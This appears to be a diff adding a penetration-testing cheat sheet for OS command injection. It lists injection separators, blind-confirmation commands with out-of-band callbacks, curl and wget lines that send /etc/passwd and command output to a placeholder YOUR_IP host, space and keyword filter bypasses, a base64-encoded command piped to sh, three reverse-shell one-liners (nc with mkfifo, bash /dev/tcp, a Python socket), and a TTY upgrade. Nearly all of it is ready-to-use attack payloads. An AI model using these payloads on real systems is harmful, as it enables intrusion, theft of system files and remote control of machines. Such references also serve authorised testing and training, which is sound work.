@@ -1,0 +1,42 @@
+# Command injection — manual reference. Confirm inline, then blind, then shell.
+
+## Separators (prefix with the app's expected value, e.g. 127.0.0.1;id)
+; id
+| id
+|| id
+& whoami
+&& id
+%0aid              # newline
+$(id)
+`id`
+%26%26id           # url-encoded &&
+
+## Blind confirm
+; sleep 5                       # Linux
+& ping -n 6 127.0.0.1           # Windows
+; curl http://YOUR_IP:PORT/cmdi-$(whoami)     # OAST to catch-server
+; nslookup $(whoami).YOUR_IP
+
+## Exfil output through the callback
+; curl http://YOUR_IP:PORT/ -d "$(cat /etc/passwd|base64 -w0)"
+; wget -qO- http://YOUR_IP:PORT/?d=$(id|base64 -w0)
+; cat /root/proof.txt > /var/www/html/p.txt       # if a web-readable dir is writable
+
+## Filter bypass
+cat</etc/passwd                 # no spaces
+{cat,/etc/passwd}
+cat${IFS}/etc/passwd
+w'h'o'a'mi                      # quote-splitting
+who$@ami
+/???/??t /etc/passwd            # globbing
+$(printf '\x69\x64')            # hex-encode 'id'
+echo aWQ=|base64 -d|sh          # base64 the command
+
+## Reverse shells from exec (set listener first; see Reverse Shells tab)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP PORT >/tmp/f
+bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",PORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["sh"])'
+
+## TTY upgrade after you land
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# then: Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
